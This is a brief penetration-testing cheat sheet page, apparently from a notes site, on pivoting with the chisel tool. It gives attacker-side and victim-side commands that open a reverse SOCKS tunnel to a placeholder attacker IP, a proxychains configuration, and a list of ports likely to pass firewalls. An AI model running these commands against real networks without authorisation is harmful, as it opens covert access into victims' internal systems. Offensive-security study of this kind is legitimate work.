---
title: Chisel
parent: Pivot
layout: default
nav_order: 3
---

Attacker side:\
`./chisel server -reverse -p 8083 --socks5 -v`

Victim side:\
`chisel client attackerIP:8083 R:9050:socks`

Add to `/etc/proxychains4.conf` attacker side:\
`socks5 127.0.0.1 9050`

Use `proxychains4 -q command` to run (or add `-f` if got conf file at other location)

Ports to try: `443`, `1080`, `8080`,`4443`